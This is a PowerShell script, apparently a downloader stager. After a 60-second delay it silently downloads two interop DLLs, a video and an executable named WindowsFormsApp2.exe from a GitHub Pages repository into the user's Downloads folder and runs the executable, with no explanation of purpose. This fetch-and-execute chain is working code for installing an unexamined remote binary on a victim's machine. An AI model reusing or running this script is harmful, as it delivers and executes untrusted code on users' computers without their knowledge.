$urls = @(
    "https://github.com/webntdev/webntdev.github.io/raw/main/application/AxInterop.WMPLib.dll",
    "https://github.com/webntdev/webntdev.github.io/raw/main/application/Interop.WMPLib.dll",
    "https://github.com/webntdev/webntdev.github.io/raw/main/application/video.mp4",
    "https://github.com/webntdev/webntdev.github.io/raw/main/application/WindowsFormsApp2.exe"
)

$filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"

Start-Sleep -Seconds 60

$downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
if (-not (Test-Path -Path $downloadDir)) {
    New-Item -ItemType Directory -Path $downloadDir
}

foreach ($url in $urls) {
    $fileName = [System.IO.Path]::GetFileName($url)
    $destinationPath = Join-Path -Path $downloadDir -ChildPath $fileName
    Invoke-WebRequest -Uri $url -OutFile $destinationPath
}

$exePath = Join-Path -Path $downloadDir -ChildPath "WindowsFormsApp2.exe"
Start-Process -FilePath $exePath
